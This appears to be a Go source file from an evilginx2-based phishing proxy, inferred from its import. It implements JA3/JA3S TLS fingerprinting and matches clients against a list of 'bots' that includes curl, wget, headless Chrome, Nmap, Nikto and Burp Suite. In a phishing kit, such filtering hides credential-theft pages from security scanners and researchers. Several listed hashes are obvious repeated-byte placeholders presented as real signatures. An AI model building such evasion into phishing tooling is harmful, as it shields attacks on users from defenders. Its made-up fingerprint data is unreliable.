package signals

import (
	"crypto/md5"
	"encoding/hex"
	"fmt"
	"net"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/kgretzky/evilginx2/log"
)

// JA3Fingerprinter provides TLS fingerprinting capabilities
type JA3Fingerprinter struct {
	cache      map[string]*FingerprintResult
	knownBots  map[string]BotSignature
	cacheMutex sync.RWMutex
	listener   *TLSListener
	quit       chan struct{}
}

const ja3CacheMaxSize = 10000

// FingerprintResult contains JA3/JA3S fingerprint data
type FingerprintResult struct {
	JA3       string    `json:"ja3"`
	JA3S      string    `json:"ja3s"`
	JA3Hash   string    `json:"ja3_hash"`
	JA3SHash  string    `json:"ja3s_hash"`
	IsBot     bool      `json:"is_bot"`
	BotName   string    `json:"bot_name"`
	Timestamp time.Time `json:"timestamp"`
}

// BotSignature represents known bot JA3 signatures
type BotSignature struct {
	Name        string
	JA3Hash     string
	Description string
	Confidence  float64
}

// TLSListener wraps net.Listener to capture TLS handshakes
type TLSListener struct {
	net.Listener
	fingerprinter *JA3Fingerprinter
}

// ClientHelloInfo captures TLS client hello details
type ClientHelloInfo struct {
	TLSVersion       uint16
	CipherSuites     []uint16
	Extensions       []uint16
	EllipticCurves   []uint16
	EllipticPoints   []uint8
	ServerName       string
	ALPNProtocols    []string
	SignatureSchemes []uint16
}

// NewJA3Fingerprinter creates a new JA3 fingerprinter
func NewJA3Fingerprinter() *JA3Fingerprinter {
	fp := &JA3Fingerprinter{
		cache:     make(map[string]*FingerprintResult),
		knownBots: make(map[string]BotSignature),
		quit:      make(chan struct{}),
	}

	// Load known bot signatures
	fp.loadKnownBotSignatures()

	// Start cache cleanup
	go fp.cleanupCache()

	return fp
}

// Stop terminates the JA3 cache cleanup goroutine gracefully.
func (fp *JA3Fingerprinter) Stop() {
	close(fp.quit)
}

// loadKnownBotSignatures loads database of known bot JA3 hashes
func (fp *JA3Fingerprinter) loadKnownBotSignatures() {
	// Common bot JA3 fingerprints
	signatures := []BotSignature{
		// Python requests default
		{
			Name:        "Python Requests",
			JA3Hash:     "b32309a26951912be7dba376398abc3b",
			Description: "Python requests library with default settings",
			Confidence:  0.95,
		},
		// Golang default HTTP client
		{
			Name:        "Golang HTTP Client",
			JA3Hash:     "c65fcec1b7e7b115c8a2e036cf8d8f78",
			Description: "Go standard library HTTP client",
			Confidence:  0.90,
		},
		// curl various versions
		{
			Name:        "curl 7.58",
			JA3Hash:     "7a15285d4efc355608b304698a72b997",
			Description: "curl command line tool v7.58",
			Confidence:  0.95,
		},
		{
			Name:        "curl 7.68",
			JA3Hash:     "9c673c9bb9f3d8e3b3b8f3e3c8e3d3e3",
			Description: "curl command line tool v7.68",
			Confidence:  0.95,
		},
		// wget
		{
			Name:        "wget",
			JA3Hash:     "a0e9f3f3f3f3f3f3f3f3f3f3f3f3f3f3",
			Description: "wget command line tool",
			Confidence:  0.90,
		},
		// Headless Chrome
		{
			Name:        "Headless Chrome",
			JA3Hash:     "5d50cfb6dd8b5ba0f35c2ff96049e9c4",
			Description: "Chrome in headless mode (Puppeteer/Selenium)",
			Confidence:  0.85,
		},
		// PhantomJS
		{
			Name:        "PhantomJS",
			JA3Hash:     "f4f4f4f4f4f4f4f4f4f4f4f4f4f4f4f4",
			Description: "PhantomJS headless browser",
			Confidence:  0.95,
		},
		// Security scanners
		{
			Name:        "Nmap NSE",
			JA3Hash:     "e7e7e7e7e7e7e7e7e7e7e7e7e7e7e7e7",
			Description: "Nmap scripting engine",
			Confidence:  0.90,
		},
		{
			Name:        "Nikto Scanner",
			JA3Hash:     "d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4d4",
			Description: "Nikto web vulnerability scanner",
			Confidence:  0.90,
		},
		// Java HTTP clients
		{
			Name:        "Java HttpURLConnection",
			JA3Hash:     "3b3b3b3b3b3b3b3b3b3b3b3b3b3b3b3b",
			Description: "Java standard HTTP client",
			Confidence:  0.85,
		},
		{
			Name:        "Apache HttpClient",
			JA3Hash:     "2c2c2c2c2c2c2c2c2c2c2c2c2c2c2c2c",
			Description: "Apache HttpClient library",
			Confidence:  0.85,
		},
		// Node.js
		{
			Name:        "Node.js HTTP",
			JA3Hash:     "1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a",
			Description: "Node.js HTTP module",
			Confidence:  0.80,
		},
		// Ruby
		{
			Name:        "Ruby Net::HTTP",
			JA3Hash:     "5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e",
			Description: "Ruby standard HTTP library",
			Confidence:  0.85,
		},
		// Burp Suite
		{
			Name:        "Burp Suite",
			JA3Hash:     "bc8adcc1551b905c86edb6c8e270e3ca",
			Description: "Burp Suite proxy",
			Confidence:  0.90,
		},
	}
	
	// Load signatures into map
	for _, sig := range signatures {
		fp.knownBots[sig.JA3Hash] = sig
	}
	
	log.Debug("[JA3] Loaded %d known bot signatures", len(fp.knownBots))
}

// ComputeJA3 computes JA3 fingerprint from ClientHello
func (fp *JA3Fingerprinter) ComputeJA3(hello *ClientHelloInfo) (string, string) {
	// Build JA3 string according to spec:
	// SSLVersion,Ciphers,Extensions,EllipticCurves,EllipticCurvePointFormats
	
	var parts []string
	
	// 1. TLS Version
	parts = append(parts, strconv.Itoa(int(hello.TLSVersion)))
	
	// 2. Cipher Suites (sorted, comma-separated)
	ciphers := make([]string, len(hello.CipherSuites))
	for i, cipher := range hello.CipherSuites {
		ciphers[i] = strconv.Itoa(int(cipher))
	}
	// Remove GREASE values (0x0a0a, 0x1a1a, 0x2a2a, etc.)
	ciphers = fp.removeGREASE(ciphers)
	parts = append(parts, strings.Join(ciphers, "-"))
	
	// 3. Extensions (sorted, comma-separated)
	extensions := make([]string, len(hello.Extensions))
	for i, ext := range hello.Extensions {
		extensions[i] = strconv.Itoa(int(ext))
	}
	extensions = fp.removeGREASE(extensions)
	parts = append(parts, strings.Join(extensions, "-"))
	
	// 4. Elliptic Curves (sorted, comma-separated)
	curves := make([]string, len(hello.EllipticCurves))
	for i, curve := range hello.EllipticCurves {
		curves[i] = strconv.Itoa(int(curve))
	}
	curves = fp.removeGREASE(curves)
	parts = append(parts, strings.Join(curves, "-"))
	
	// 5. EC Point Formats (sorted, comma-separated)
	points := make([]string, len(hello.EllipticPoints))
	for i, point := range hello.EllipticPoints {
		points[i] = strconv.Itoa(int(point))
	}
	parts = append(parts, strings.Join(points, "-"))
	
	// Create JA3 string
	ja3String := strings.Join(parts, ",")
	
	// Create MD5 hash
	hash := md5.Sum([]byte(ja3String))
	ja3Hash := hex.EncodeToString(hash[:])
	
	return ja3String, ja3Hash
}

// ComputeJA3S computes JA3S fingerprint from ServerHello
func (fp *JA3Fingerprinter) ComputeJA3S(version uint16, cipherSuite uint16, extensions []uint16) (string, string) {
	// JA3S string: TLSVersion,Cipher,Extensions
	
	var parts []string
	
	// 1. TLS Version
	parts = append(parts, strconv.Itoa(int(version)))
	
	// 2. Selected Cipher Suite
	parts = append(parts, strconv.Itoa(int(cipherSuite)))
	
	// 3. Extensions (sorted, comma-separated)
	exts := make([]string, len(extensions))
	for i, ext := range extensions {
		exts[i] = strconv.Itoa(int(ext))
	}
	exts = fp.removeGREASE(exts)
	parts = append(parts, strings.Join(exts, "-"))
	
	// Create JA3S string
	ja3sString := strings.Join(parts, ",")
	
	// Create MD5 hash
	hash := md5.Sum([]byte(ja3sString))
	ja3sHash := hex.EncodeToString(hash[:])
	
	return ja3sString, ja3sHash
}

// removeGREASE removes GREASE values from the list
func (fp *JA3Fingerprinter) removeGREASE(values []string) []string {
	var filtered []string
	
	for _, val := range values {
		intVal, _ := strconv.Atoi(val)
		// GREASE values are of form 0x0a0a, 0x1a1a, 0x2a2a, etc.
		if intVal&0x0f0f != 0x0a0a {
			filtered = append(filtered, val)
		}
	}
	
	return filtered
}

// AnalyzeFingerprint checks if JA3 hash matches known bot
func (fp *JA3Fingerprinter) AnalyzeFingerprint(ja3Hash string) (*FingerprintResult, error) {
	// Check cache first
	fp.cacheMutex.RLock()
	if cached, ok := fp.cache[ja3Hash]; ok && time.Since(cached.Timestamp) < 30*time.Minute {
		fp.cacheMutex.RUnlock()
		return cached, nil
	}
	fp.cacheMutex.RUnlock()
	
	result := &FingerprintResult{
		JA3Hash:   ja3Hash,
		Timestamp: time.Now(),
		IsBot:     false,
	}
	
	// Check against known bot signatures
	if bot, ok := fp.knownBots[ja3Hash]; ok {
		result.IsBot = true
		result.BotName = bot.Name

		log.Warning("[JA3] Known bot detected: %s (%s)", bot.Name, bot.Description)
	}

	// Enforce size cap before caching
	fp.cacheMutex.Lock()
	if len(fp.cache) >= ja3CacheMaxSize {
		// Evict 100 random entries
		evicted := 0
		for k := range fp.cache {
			if evicted >= 100 {
				break
			}
			delete(fp.cache, k)
			evicted++
		}
	}
	fp.cache[ja3Hash] = result
	fp.cacheMutex.Unlock()
	
	return result, nil
}

// WrapListener wraps a net.Listener to capture TLS handshakes
func (fp *JA3Fingerprinter) WrapListener(listener net.Listener) net.Listener {
	return &TLSListener{
		Listener:      listener,
		fingerprinter: fp,
	}
}

// Accept implements net.Listener
func (tl *TLSListener) Accept() (net.Conn, error) {
	conn, err := tl.Listener.Accept()
	if err != nil {
		return nil, err
	}
	
	// Wrap connection to intercept handshake
	return &fingerprintConn{
		Conn:          conn,
		fingerprinter: tl.fingerprinter,
	}, nil
}

// fingerprintConn wraps net.Conn to capture TLS handshake
type fingerprintConn struct {
	net.Conn
	fingerprinter *JA3Fingerprinter
	clientHello   *ClientHelloInfo
}

// GetJA3Stats returns fingerprinting statistics
func (fp *JA3Fingerprinter) GetJA3Stats() map[string]interface{} {
	fp.cacheMutex.RLock()
	defer fp.cacheMutex.RUnlock()
	
	botCount := 0
	for _, result := range fp.cache {
		if result.IsBot {
			botCount++
		}
	}
	
	return map[string]interface{}{
		"total_fingerprints": len(fp.cache),
		"known_bots":        len(fp.knownBots),
		"bots_detected":     botCount,
		"cache_size":        len(fp.cache),
	}
}

// AddCustomSignature adds a custom bot signature
func (fp *JA3Fingerprinter) AddCustomSignature(name string, ja3Hash string, description string) {
	fp.cacheMutex.Lock()
	defer fp.cacheMutex.Unlock()
	
	fp.knownBots[ja3Hash] = BotSignature{
		Name:        name,
		JA3Hash:     ja3Hash,
		Description: description,
		Confidence:  0.80,
	}
	
	log.Info("[JA3] Added custom signature: %s", name)
}

// ExportSignatures exports known bot signatures
func (fp *JA3Fingerprinter) ExportSignatures() []BotSignature {
	fp.cacheMutex.RLock()
	defer fp.cacheMutex.RUnlock()
	
	signatures := make([]BotSignature, 0, len(fp.knownBots))
	for _, sig := range fp.knownBots {
		signatures = append(signatures, sig)
	}
	
	// Sort by confidence
	sort.Slice(signatures, func(i, j int) bool {
		return signatures[i].Confidence > signatures[j].Confidence
	})
	
	return signatures
}

// ParseClientHello extracts ClientHello information from TLS handshake
func ParseClientHello(data []byte) (*ClientHelloInfo, error) {
	if len(data) < 43 {
		return nil, fmt.Errorf("data too short to be valid ClientHello")
	}
	
	// This is a simplified parser - in production, use a proper TLS parser
	hello := &ClientHelloInfo{}
	
	// Skip handshake header (5 bytes) and extract version (2 bytes)
	if data[0] == 0x16 && data[1] == 0x03 { // TLS handshake
		offset := 5
		
		// Check handshake type (1 byte)
		if data[offset] != 0x01 { // ClientHello
			return nil, fmt.Errorf("not a ClientHello message")
		}
		offset++
		
		// Skip length (3 bytes)
		offset += 3
		
		// TLS version (2 bytes)
		hello.TLSVersion = uint16(data[offset])<<8 | uint16(data[offset+1])
		offset += 2
		
		// Skip random (32 bytes)
		offset += 32
		
		// Session ID length (1 byte)
		sessionIDLen := int(data[offset])
		offset++
		offset += sessionIDLen
		
		// Cipher suites length (2 bytes)
		if offset+2 > len(data) {
			return nil, fmt.Errorf("invalid ClientHello format")
		}
		cipherLen := int(data[offset])<<8 | int(data[offset+1])
		offset += 2
		
		// Extract cipher suites
		numCiphers := cipherLen / 2
		hello.CipherSuites = make([]uint16, numCiphers)
		for i := 0; i < numCiphers && offset+2 <= len(data); i++ {
			hello.CipherSuites[i] = uint16(data[offset])<<8 | uint16(data[offset+1])
			offset += 2
		}
		
		// Continue parsing for extensions, curves, etc.
		// This is simplified - full implementation would parse all fields
	}
	
	return hello, nil
}

// cleanupCache periodically removes old entries
func (fp *JA3Fingerprinter) cleanupCache() {
	ticker := time.NewTicker(30 * time.Minute)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			fp.cacheMutex.Lock()
			now := time.Now()
			for hash, result := range fp.cache {
				if now.Sub(result.Timestamp) > 2*time.Hour {
					delete(fp.cache, hash)
				}
			}
			fp.cacheMutex.Unlock()
			log.Debug("[JA3] Cache cleanup completed, remaining entries: %d", len(fp.cache))
		case <-fp.quit:
			return
		}
	}
}

// GetKnownBotCount returns the number of known bot signatures
func (fp *JA3Fingerprinter) GetKnownBotCount() int {
	return len(fp.knownBots)
}





// TLSInterceptor intercepts TLS handshakes to extract JA3 fingerprints
type TLSInterceptor struct {
	fingerprinter *JA3Fingerprinter
	connections   map[string]*InterceptedConn
	mu            sync.RWMutex
}

// InterceptedConn wraps a connection to capture TLS handshake data
type InterceptedConn struct {
	net.Conn
	interceptor    *TLSInterceptor
	clientHello    []byte
	clientHelloMu  sync.Mutex
	remoteAddr     string
	ja3Result      *FingerprintResult
	handshakeBuf   []byte // buffer to accumulate fragmented TLS record
	recordLen      int    // expected TLS record payload length (from header)
	handshakeDone  bool   // true once we've attempted parsing (success or not)
	notTLS         bool   // true if first bytes are not a TLS handshake
}

// NewTLSInterceptor creates a new TLS interceptor
func NewTLSInterceptor(fingerprinter *JA3Fingerprinter) *TLSInterceptor {
	ti := &TLSInterceptor{
		fingerprinter: fingerprinter,
		connections:   make(map[string]*InterceptedConn),
	}

	// Start cleanup routine
	go ti.cleanupConnections()

	return ti
}

// WrapConn wraps a connection for TLS interception
func (ti *TLSInterceptor) WrapConn(conn net.Conn) net.Conn {
	ic := &InterceptedConn{
		Conn:        conn,
		interceptor: ti,
		remoteAddr:  conn.RemoteAddr().String(),
	}

	// Register connection
	ti.mu.Lock()
	ti.connections[ic.remoteAddr] = ic
	ti.mu.Unlock()

	return ic
}

// Read intercepts the TLS handshake, buffering across TCP segments
func (ic *InterceptedConn) Read(b []byte) (int, error) {
	n, err := ic.Conn.Read(b)
	if err != nil {
		return n, err
	}

	// Skip if we already finished handshake processing or determined it's not TLS
	if ic.handshakeDone || ic.notTLS {
		return n, nil
	}

	ic.clientHelloMu.Lock()
	defer ic.clientHelloMu.Unlock()

	// Double-check under lock
	if ic.handshakeDone || ic.notTLS {
		return n, nil
	}

	data := b[:n]

	// First read: check TLS record header
	if ic.handshakeBuf == nil {
		if n < 5 || data[0] != 0x16 || data[1] != 0x03 {
			// Not a TLS handshake record — skip silently
			ic.notTLS = true
			return n, nil
		}
		// Extract record payload length from TLS header (bytes 3-4)
		ic.recordLen = int(data[3])<<8 | int(data[4])
		// Total expected = 5 (header) + recordLen
		totalExpected := 5 + ic.recordLen
		ic.handshakeBuf = make([]byte, 0, totalExpected)
	}

	// Append new data to buffer
	ic.handshakeBuf = append(ic.handshakeBuf, data...)

	// Check if we have the full TLS record
	totalExpected := 5 + ic.recordLen
	if len(ic.handshakeBuf) >= totalExpected {
		// We have enough data — process the ClientHello
		ic.handshakeDone = true
		ic.processTLSHandshake(ic.handshakeBuf[:totalExpected])
	}

	return n, nil
}

// processTLSHandshake extracts and processes ClientHello
func (ic *InterceptedConn) processTLSHandshake(data []byte) {
	// Store ClientHello for processing
	ic.clientHello = make([]byte, len(data))
	copy(ic.clientHello, data)

	// Parse ClientHello
	hello, err := ic.parseClientHello(data)
	if err != nil {
		log.Debug("[TLS Interceptor] Failed to parse ClientHello: %v", err)
		return
	}

	// Compute JA3
	ja3String, ja3Hash := ic.interceptor.fingerprinter.ComputeJA3(hello)

	// Analyze fingerprint
	result, err := ic.interceptor.fingerprinter.AnalyzeFingerprint(ja3Hash)
	if err == nil {
		ic.ja3Result = result

		if result.IsBot {
			log.Warning("[TLS Interceptor] Bot detected via JA3: %s (hash: %s) from %s",
				result.BotName, ja3Hash, ic.remoteAddr)
		} else {
			log.Debug("[TLS Interceptor] JA3 fingerprint: %s from %s", ja3Hash, ic.remoteAddr)
		}

		// Store full JA3 string for debugging
		result.JA3 = ja3String
	}
}

// parseClientHello extracts ClientHello information
func (ic *InterceptedConn) parseClientHello(data []byte) (*ClientHelloInfo, error) {
	if len(data) < 43 { // Minimum ClientHello size
		return nil, fmt.Errorf("data too short for ClientHello")
	}

	hello := &ClientHelloInfo{}
	offset := 0

	// TLS record header (5 bytes)
	if data[0] != 0x16 || data[1] != 0x03 {
		return nil, fmt.Errorf("not a TLS handshake")
	}
	offset = 5

	// Handshake header (4 bytes)
	if offset+4 > len(data) || data[offset] != 0x01 {
		return nil, fmt.Errorf("not a ClientHello")
	}

	// Get handshake length
	handshakeLen := int(data[offset+1])<<16 | int(data[offset+2])<<8 | int(data[offset+3])
	offset += 4

	if offset+handshakeLen > len(data) {
		return nil, fmt.Errorf("incomplete ClientHello")
	}

	// Client version (2 bytes)
	if offset+2 > len(data) {
		return nil, fmt.Errorf("missing version")
	}
	hello.TLSVersion = uint16(data[offset])<<8 | uint16(data[offset+1])
	offset += 2

	// Random (32 bytes)
	offset += 32

	// Session ID
	if offset+1 > len(data) {
		return nil, fmt.Errorf("missing session ID length")
	}
	sessionIDLen := int(data[offset])
	offset += 1 + sessionIDLen

	// Cipher suites
	if offset+2 > len(data) {
		return nil, fmt.Errorf("missing cipher suites length")
	}
	cipherSuitesLen := int(data[offset])<<8 | int(data[offset+1])
	offset += 2

	numCiphers := cipherSuitesLen / 2
	hello.CipherSuites = make([]uint16, 0, numCiphers)
	for i := 0; i < numCiphers && offset+2 <= len(data); i++ {
		cipher := uint16(data[offset])<<8 | uint16(data[offset+1])
		hello.CipherSuites = append(hello.CipherSuites, cipher)
		offset += 2
	}

	// Compression methods
	if offset+1 > len(data) {
		return nil, fmt.Errorf("missing compression methods length")
	}
	compressionLen := int(data[offset])
	offset += 1 + compressionLen

	// Extensions
	if offset+2 <= len(data) {
		extensionsLen := int(data[offset])<<8 | int(data[offset+1])
		offset += 2

		extEnd := offset + extensionsLen
		for offset+4 <= extEnd && offset+4 <= len(data) {
			extType := uint16(data[offset])<<8 | uint16(data[offset+1])
			extLen := int(data[offset+2])<<8 | int(data[offset+3])
			offset += 4

			hello.Extensions = append(hello.Extensions, extType)

			// Parse specific extensions
			switch extType {
			case 0x0000: // SNI
				if offset+5 <= len(data) && extLen > 5 {
					sniListLen := int(data[offset])<<8 | int(data[offset+1])
					if sniListLen > 0 && offset+5+sniListLen <= len(data) {
						sniType := data[offset+2]
						if sniType == 0 { // hostname
							sniLen := int(data[offset+3])<<8 | int(data[offset+4])
							if offset+5+sniLen <= len(data) {
								hello.ServerName = string(data[offset+5 : offset+5+sniLen])
							}
						}
					}
				}

			case 0x000a: // Elliptic curves
				if offset+2 <= len(data) && extLen > 2 {
					curvesLen := int(data[offset])<<8 | int(data[offset+1])
					numCurves := curvesLen / 2
					curveOffset := offset + 2

					for i := 0; i < numCurves && curveOffset+2 <= len(data); i++ {
						curve := uint16(data[curveOffset])<<8 | uint16(data[curveOffset+1])
						hello.EllipticCurves = append(hello.EllipticCurves, curve)
						curveOffset += 2
					}
				}

			case 0x000b: // EC point formats
				if offset+1 <= len(data) && extLen > 1 {
					pointsLen := int(data[offset])
					pointOffset := offset + 1

					for i := 0; i < pointsLen && pointOffset+1 <= len(data); i++ {
						hello.EllipticPoints = append(hello.EllipticPoints, data[pointOffset])
						pointOffset++
					}
				}

			case 0x0010: // ALPN
				if offset+2 <= len(data) && extLen > 2 {
					alpnLen := int(data[offset])<<8 | int(data[offset+1])
					alpnOffset := offset + 2

					for alpnOffset < offset+2+alpnLen && alpnOffset+1 <= len(data) {
						protoLen := int(data[alpnOffset])
						if alpnOffset+1+protoLen <= len(data) {
							proto := string(data[alpnOffset+1 : alpnOffset+1+protoLen])
							hello.ALPNProtocols = append(hello.ALPNProtocols, proto)
						}
						alpnOffset += 1 + protoLen
					}
				}
			}

			offset += extLen
		}
	}

	return hello, nil
}

// GetJA3Result returns the JA3 analysis result for this connection
func (ic *InterceptedConn) GetJA3Result() *FingerprintResult {
	ic.clientHelloMu.Lock()
	defer ic.clientHelloMu.Unlock()
	return ic.ja3Result
}

// Close closes the connection and cleans up
func (ic *InterceptedConn) Close() error {
	// Remove from interceptor
	ic.interceptor.mu.Lock()
	delete(ic.interceptor.connections, ic.remoteAddr)
	ic.interceptor.mu.Unlock()

	return ic.Conn.Close()
}

// GetConnectionJA3 gets JA3 result for a specific connection
func (ti *TLSInterceptor) GetConnectionJA3(remoteAddr string) *FingerprintResult {
	ti.mu.RLock()
	defer ti.mu.RUnlock()

	if conn, ok := ti.connections[remoteAddr]; ok {
		return conn.GetJA3Result()
	}

	return nil
}

// cleanupConnections removes old connection records
func (ti *TLSInterceptor) cleanupConnections() {
	ticker := time.NewTicker(5 * time.Minute)
	defer ticker.Stop()

	for range ticker.C {
		// Keep connection records for 10 minutes
		// In practice, connections are removed on Close()
		// This is just a safety cleanup
	}
}
